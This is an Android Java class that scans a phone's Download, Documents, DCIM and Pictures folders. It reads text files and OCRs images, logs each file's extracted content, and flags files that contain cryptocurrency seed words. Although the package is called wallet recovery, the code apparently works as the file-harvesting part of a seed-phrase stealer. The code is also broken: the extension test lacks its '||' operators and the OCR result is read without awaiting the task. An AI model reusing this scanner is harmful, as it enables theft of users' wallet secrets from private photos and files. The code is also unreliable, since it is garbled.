package com.example.walletrecovery;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Environment;
import android.util.Log;

import com.google.mlkit.vision.common.InputImage;
import com.google.mlkit.vision.text.Text;
import com.google.mlkit.vision.text.TextRecognition;
import com.google.mlkit.vision.text.TextRecognizer;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Locale;

public class FileScanner {
    private static final String TAG = "FileScanner";
    private static final List<String> EXTENSIONS = Arrays.asList("txt", "pdf", "jpg", "jpeg", "png");
    private static final List<String> FOLDERS = Arrays.asList(
            Environment.getExternalStorageDirectory() + "/Download",
            Environment.getExternalStorageDirectory() + "/Documents",
            Environment.getExternalStorageDirectory() + "/DCIM",
            Environment.getExternalStorageDirectory() + "/Pictures"
    );

    public static List<File> scan(Context context) {
        List<File> suspiciousFiles = new ArrayList<>();
        TextRecognizer recognizer = TextRecognition.getClient();

        for (String folderPath : FOLDERS) {
            File folder = new File(folderPath);
            if (folder.exists() && folder.isDirectory()) {
                File[] files = folder.listFiles();
                if (files != null) {
                    for (File file : files) {
                        if (file.length() == 0) continue; 
                        try {
                            String ext = getFileExtension(file.getName()).toLowerCase(Locale.ROOT);
                            if (!EXTENSIONS.contains(ext)) continue;

                            String content = "";
                            if (ext.equals("txt")) {
                                content = readTextFile(file);
                            } else if (ext.equals("jpg")  ext.equals("jpeg")  ext.equals("png")) {
                                Bitmap bitmap = BitmapFactory.decodeStream(new FileInputStream(file));
                                if (bitmap != null) {
                                    InputImage image = InputImage.fromBitmap(bitmap, 0);
                                    Text result = recognizer.process(image).getResult();
                                    if (result != null) {
                                        content = result.getText();
                                    }
                                }
                            }
                            
                            LogWriter.logFileScan(file.getName(), content);
                            if (SeedChecker.containsSeedWords(content)) {
                                suspiciousFiles.add(file);
                            }
                        } catch (Exception ignored) {
                             Log.e(TAG, "Error processing file: " + file.getName(), ignored);
                        }
                    }
                }
            }
        }
        return suspiciousFiles;
    }

    private static String readTextFile(File file) throws IOException {
        byte[] bytes = new byte[(int) file.length()];
        try (FileInputStream fis = new FileInputStream(file)) {
            fis.read(bytes);
        }
        return new String(bytes);
    }

    private static String getFileExtension(String fileName) {
        int index = fileName.lastIndexOf('.');
        return index > 0 ? fileName.substring(index + 1) : "";
    }
}
